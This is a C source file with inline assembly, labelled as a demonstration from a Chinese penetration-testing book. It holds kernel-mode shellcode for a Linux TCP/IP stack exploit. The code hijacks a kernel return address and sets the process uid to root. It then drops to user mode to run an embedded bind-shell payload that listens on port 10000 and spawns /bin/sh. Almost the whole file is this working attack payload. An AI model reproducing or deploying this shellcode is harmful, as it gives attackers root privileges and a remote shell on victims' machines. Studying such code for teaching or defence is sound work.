/* shellcode.c
*
*  《网络渗透技术》演示程序
*  作者：san, alert7, eyas, watercloud
*
*  为TCP/IP协议栈的利用程序编写的shellcode代码
*/

#include <stdio.h>

int main(int argc, char *argv[])
{
                __asm__("
                RETLOC2 = 0xC02C20A8
                SAVEADDR = 0XC02C2484
                mov $0xffffe000,%eax
                and %esp,%edi
                add $0x700,%edi #DEST IN edi
                mov %edi,%ebp #save est in ebp

                call next
        next:
                pop %esi                #esi is eip
        next1:
                add $(shellcode2begin-next),%esi       #esi point to shellcode2begin
                mov $(shellcode2end-shellcode2begin),%ecx
                repz movsb %ds:(%esi),%es:(%edi)

                mov $(RETLOC2),%eax
                mov $(SAVEADDR),%ebx
                mov (%eax),%ecx
                mov %ecx,(%ebx)
                mov %ebp,(%eax)

        exit:
                            #需要在中断上下文中返回

        add $0x220,%esp
        pop %ebx
        pop %esi
        pop %ebp
        ret

        shellcode2begin: 
#                               [ SHELLCODE2 ]
#-----------------------------------------------------------------------
        mov %esp,%eax

shellcode2next:
        add $0x4,%eax
        mov (%eax),%ebx
        cmp $0x23,%ebx#//查找堆栈里的0x23
        jne shellcode2next

        sub $0x04,%eax
        mov (%eax),%ecx
        andl $0x08000000,%ecx
        cmp $0x08000000,%ecx
        jne shellcode2L1
        jmp shellcode2L2

shellcode2L1:
        mov     (%eax),%ecx
        andl $0x40000000,%ecx
        cmp $0x40000000,%ecx
        je shellcode2L2
        add $0x04,%eax
        jmp shellcode2next

shellcode2L2:
        mov %eax,%esp#//纠正堆栈

        mov $0xbffff000,%ebp
        mov %ebp,(%eax)# //now ebp save ring3 shellcode

        mov    $0xffffe000,%eax
        and    %esp,%eax
        movl   $0x0,0x128(%eax) #// change to root

        jmp shellcode2L3

shellcode2L4:
        pop %esi
        mov %ebp,%edi
        mov $0x400,%ecx#// 1024 bytes shellcode应该足够了
        repz movsb %ds:(%esi),%es:(%edi)


        mov $(RETLOC2),%eax
        mov $(SAVEADDR),%ebx
        mov (%ebx),%ecx
        mov %ecx,(%eax)

        push $0x2b
        push $0x2b
        pop %es
        pop %ds#  //设置ds为0x2b

        iret

shellcode2L3:
    Call shellcode2L4

RING3SHELLCODE:
 #bindshell port 10000
    .string \"\x31\xdb\xf7\xe3\xb0\x66\x53\x43\x53\x43\x53\x89\xe1\x4b\xcd\x80\x89\xc7\x52\x66\x68\x27\x10\x43\x66\x53\x89\xe1\xb0\x10\x50\x51\x57\x89\xe1\xb0\x66\xcd\x80\xb0\x66\xb3\x04\xcd\x80\x50\x50\x57\x89\xe1\x43\xb0\x66\xcd\x80\x89\xd9\x89\xc3\xb0\x3f\x49\xcd\x80\x41\xe2\xf8\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x51\x53\x89\xe1\xb0\x0b\xcd\x80\"
RING3SHELLCODEEND:
#-----------------------------------------------------------------------------------------------------

        shellcode2end:
                 ");
        return 0;
}

